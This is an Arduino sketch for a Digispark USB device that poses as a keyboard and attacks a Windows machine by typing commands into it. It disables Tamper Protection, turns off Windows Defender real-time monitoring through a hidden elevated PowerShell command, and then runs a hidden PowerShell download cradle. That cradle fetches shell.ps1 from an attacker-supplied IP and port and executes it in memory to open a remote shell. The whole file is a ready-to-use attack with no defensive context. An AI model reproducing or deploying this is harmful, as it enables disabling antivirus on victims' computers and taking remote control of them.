#include "DigiKeyboard.h"
void setup() {
  
}

void loop() {
  //Disable Tamper Protection (allows us to change Windows Defender settings through the CLI)"
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("Tamper Protection");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(79);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // tab 4
  DigiKeyboard.delay(400);
  DigiKeyboard.sendKeyStroke(43); //43 stands for the ALT key.
  DigiKeyboard.delay(400);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(400);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(400);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(400);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(400);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(400);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);

// Turns off Real Time Monitoring. High delays are added in this section, edit them according to your target.
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

// Downloads the payload and executes it in the background. Payload isn't stored, just executed. Use task manager to terminate the shell.
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('http://IP:PORT/shell.ps1');\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  for (;;) {
    /*empty*/
  }

}